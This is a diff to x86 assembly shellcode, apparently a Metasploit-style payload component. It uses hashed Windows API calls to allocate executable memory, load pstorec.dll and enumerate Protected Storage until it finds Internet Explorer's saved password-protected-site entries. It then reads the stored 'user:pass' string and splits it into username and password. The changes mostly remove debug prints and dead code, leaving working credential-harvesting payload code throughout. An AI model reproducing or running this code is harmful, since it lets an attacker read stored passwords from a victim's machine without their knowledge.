@@ -18,9 +18,7 @@ jmp after_functions
 alloc_memory: ; returns address to allocation in eax
   push byte 0x40         ; PAGE_EXECUTE_READWRITE
   push 0x1000            ; MEM_COMMIT
-  push 0x00400000        ; Stage allocation (8Mb ought to do us)
-;  push 0x00040000	 ; other sizes don't change amount allocated (?)
-;  push 0x00000400
+  push 0x00001000	 ; allocate 1000 Byte for each variable (could be less I guess)
   push 0                 ; NULL as we dont care where the allocation is
   push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
   call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXE$
@@ -62,13 +60,10 @@ after_functions:
   call alloc_memory
   push eax		 ; save on stack
 
-  alloc_pPStore:	 
+  alloc_pPStore:
   call alloc_memory
   push eax		 ; save on stack
 
-
-;mov edx, "2_r!"
-;call print_eax
 
 load_pstorec:		 ; loads the pstorec.dll
   push 0x00636572        ; Push the bytes 'pstorec',0 onto the stack.
@@ -80,33 +75,9 @@ load_pstorec:		 ; loads the pstorec.dll
                          ; DLL-Module in eax
   mov ebx, eax		 ; save handle in ebx
 
-;  add esp, 0x08
   pop edx		 ; remove string from stack
   pop edx
 
-
-;mov edx, "3_r!"
-;call print_eax
-
-GetProcAddress_PStoreCreateInstance: ;we hash the function instead
-;  push 0x00000000	 ; Push Bytes 'PStoreCreateInstance', 0
-;  push 0x65636e61
-;  push 0x74736e49
-;  push 0x65746165
-;  push 0x72436572
-;  push 0x6f745350
-;  push esp		 ; Push Pointer to this String
-;  push ebx		 ; Push handle to pstorec DLL-Module
-;  push 0x7802F749        ; hash  ( "kernel32.dll", "GetProcAddress" )
-;  call ebp		 ; returns PStoreCreateInstance address in eax
-
-;  add esp, 0x18
-;  pop edx		 ; remove string from stack
-;  pop edx
-;  pop edx
-;  pop edx
-;  pop edx
-;  pop edx
 
 PStoreCreateInstance_PStore:; returns address to PStore (00942524) in pPStore (0012FEF4)
   pop edi		 ; pop pPstore
@@ -118,18 +89,6 @@ PStoreCreateInstance_PStore:; returns address to PStore (00942524) in pPStore (0
   push edi               ; arg4: pPstore
   push  0x2664BDDB       ; hash  ( "pstorec.dll", "PStoreCreateInstance" )
   call ebp               ; PstoreCreateInstance(address, 0, 0, 0)
-
-
-;mov edx, "4_r0"
-;call print_eax
-;mov eax, 1
-
-;  mov edx, "PCr0"	 ; Return value should be null for s_ok
-;  call print_eax
-
-;  mov eax, [edi]
-;  mov edx, "*Pr!"
-;  call print_eax
 
 PStore.EnumTypes: 	 ; returns address to EnumPStoreTypes (00942568) in pEnumPStoreTypes (0012FEE8)
   pop eax		 ; pop pPstore
@@ -146,11 +105,8 @@ PStore.EnumTypes: 	 ; returns address to EnumPStoreTypes (00942568) in pEnumPSto
   add edx, 0x00005586
   call edx		 ; call IPStore::EnumTypes
 
-;mov edx, "5_r0"
-;call print_eax
-;mov eax, 1
-
   mov edi, 0x5e7e8100 	 ; Value of pTypeGUID if Password is IE:Password-Protected
+
 EnumPStoreTypes.raw_Next:
   pop eax		 ; pop pPStore
   pop edx		 ; pop pEnumPStoreTypes
@@ -168,25 +124,14 @@ EnumPStoreTypes.raw_Next:
   add edx, 0x00004E4F
   call edx		 ; call EnumPStoreTypes::raw_Next
 
-;mov edx, "6_r0"
-;call print_eax
-;mov eax, 1
-
-;  mov eax, edi
-;  mov edx, "EDX"
-;  call print_eax
-
   mov eax, [esp+8]
   mov eax, [eax]
-;  mov edx, "GUID"
-;  call print_eax
 
   mov edx, 0x00000000
   cmp edx, eax
-  jz no_auth 		 ; no Password found 
+  jz no_auth 		 ; no Password found
   cmp edi, eax		 ; do this until TypeGUID indicates "IE Password Protected sites"
   jne EnumPStoreTypes.raw_Next
-
 
 PStore.EnumSubtypes:     ; returns address to EnumSubtypes () in pEnumSubtypes ()
   pop eax                ; pop pPstore
@@ -208,10 +153,6 @@ PStore.EnumSubtypes:     ; returns address to EnumSubtypes () in pEnumSubtypes (
   add edx, 0x0000560C
   call edx               ; call IPStore::EnumSubtypes
 
-;mov edx, "7_r0"
-;call print_eax
-;mov eax, 1
-
 EnumSubtypes.raw_Next:
   mov eax, [esp+0x0C]    ; pop pEnumSubtypes
   mov edx, [esp+0x10]    ; pop psubTypeGUID
@@ -224,10 +165,6 @@ EnumSubtypes.raw_Next:
   mov edx, ebx           ; generate function address of raw_Next in pstorec.dll
   add edx, 0x00004E4F
   call edx               ; call EnumSubtypes.raw_Next
-
-;mov edx, "8_r0"
-;call print_eax
-;mov eax, 1
 
 PStore.EnumItems:
   pop eax		 ; pop pPstore
@@ -250,10 +187,6 @@ PStore.EnumItems:
   add edx, 0x000056A0
   call edx               ; call IPStore::Enumitems
 
-;mov edx, "9_r0"
-;call print_eax
-;mov eax, 1
-
 spEnumItems.raw_Next:
   mov eax, [esp+0x14]    ; pop pspEnumItems
   mov ecx, [esp+0x18]    ; pop pitemName
@@ -266,10 +199,6 @@ spEnumItems.raw_Next:
   mov edx, ebx		 ; generate function address of raw_Next in pstorec.dll
   add edx, 0x000048D1
   call edx
-
-;mov edx, "10r0"
-;call print_eax
-;mov eax, 1
 
 PStore.ReadItem:
   pop eax		 ; pop pPStore
@@ -295,19 +224,6 @@ PStore.ReadItem:
   add edx, 0x000042B6
   call edx
 
-;mov edx, "11r0"
-;call print_eax
-;mov eax, 1
-
-;mov edx, [esp+0x1C]
-;mov edx, [edx]
-;mov edx, [edx]
-;mov eax, [esp+0x1C]
-;mov eax, [eax]
-;mov eax, [eax]
-;call print_eax
-
-
 split_user_pass:
   mov eax, [esp+0x1C]    ; eax = ppsData
   mov eax, [eax]	 ; now eax contains pointer to "user:pass"
@@ -317,7 +233,6 @@ split_user_pass:
   cmp cl, dl
   jz no_auth
   loop_split:
-;  mov eax, [eax+1]
   inc eax
   mov dl, byte [eax]
   cmp cl, dl
@@ -327,29 +242,13 @@ split_user_pass:
   inc eax
   push eax  		 ; push pointer to pass
 
-;pop eax
-;mov eax, [esp]
-;mov edx, [esp+4]
-;call print_eax
-
-;pop eax
-;mov eax, [eax]
-;mov edx, "13us"
-;mov edx, [esp+4]
-;call print_eax
-
 no_auth:
 
-
-
 ;  mov edi, 0x00000006	  ; counter for loop
-;free_memory:		  ; returns 0, which means that it failed =(
+;free_memory:		  ; doesn't work yet
 ;  push 0x00008000
 ;  push 0x00000000
 ;  push 0x300F2F0B        ; hash( "kernel32.dll", "VirtualFree" )
 ;  call ebp
-;  mov edx, "0Fr!"
-;  add edx, edi
-;  call print_eax
 ;  dec di
 ;  jnz free_memory
